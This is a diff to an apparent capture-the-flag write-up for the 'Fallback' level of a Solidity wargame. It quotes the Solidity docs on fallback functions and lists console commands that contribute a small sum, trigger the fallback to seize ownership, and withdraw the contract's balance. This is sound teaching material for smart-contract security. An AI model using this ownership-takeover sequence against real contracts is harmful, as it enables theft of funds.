@@ -13,14 +13,9 @@ Here are some useful links:
 
 
 # Solution:
-## Level 1:
-Solution:
+## Level 1 Fallback:
 Solidity documentation release 0.6.4 :
-"A contract can have at most one fallback function, declared using fallback () external [payable] (without the function
-keyword). This function cannot have arguments, cannot return anything and must have external visibility. It is  
-executed on a call to the contract if none of the other functions match the given function signature, or if no data 
-was supplied at all and there is no receive Ether function. The fallback function always receives data,
-but in order to also receive Ether it must be marked payable." p. 99
+"A contract can have at most one fallback function, declared using fallback () external [payable] (without the function keyword). This function cannot have arguments, cannot return anything and must have external visibility. It is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no receive Ether function. The fallback function always receives data, but in order to also receive Ether it must be marked payable." p. 99
 
 "msg.value (uint): number of wei sent with the message" p. 73
 
@@ -32,12 +27,12 @@ contributions (using the contribute() function). Once that’s done we will beco
 We can then use the withdraw() function to reduce its balance to 0.
 
 We will solve this challenge using the following command in the console (can be access by clickin F12):
-  await contract.owner()
-  player
-	await contract.contributions(player)
-	await contract.contribute({value:1})
-	await contract.contributions(player)
-	await contract.sendTransaction({value:1})
-	await contract.owner()
-	player
-	await contract.withdraw()
+        *await contract.owner()*
+        *player*
+	*await contract.contributions(player)*
+	*await contract.contribute({value:1})*
+	*await contract.contributions(player)*
+	*await contract.sendTransaction({value:1})*
+	*await contract.owner()*
+	*player*
+	*await contract.withdraw()*
